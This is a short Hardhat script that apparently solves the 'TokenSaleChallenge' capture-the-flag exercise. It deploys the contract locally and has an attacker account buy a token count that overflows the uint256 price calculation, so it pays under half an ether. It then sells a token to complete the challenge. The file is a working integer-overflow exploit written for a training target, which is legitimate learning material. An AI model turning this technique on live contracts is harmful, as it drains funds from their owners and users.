const { ethers } = require("hardhat");

async function main() {
  const [deployer, attacker] = await hre.ethers.getSigners();
  const MainContract = await ethers.getContractFactory("TokenSaleChallenge", deployer);

  const mainContract = await MainContract.deploy(attacker.address, { value: ethers.utils.parseEther("1") });
  const maxUint = ethers.BigNumber.from("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF");
  const tokensToPurchaseForOverflow = maxUint.div(ethers.utils.parseEther("1")).add(1);

  await mainContract.connect(attacker).buy(tokensToPurchaseForOverflow, { value: "415992086870360064" });
  console.log("Initial balance:", (await mainContract.balanceOf(attacker.address)).toString());

  await mainContract.connect(attacker).sell(1);
  console.log("Is completed:", await mainContract.isComplete());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
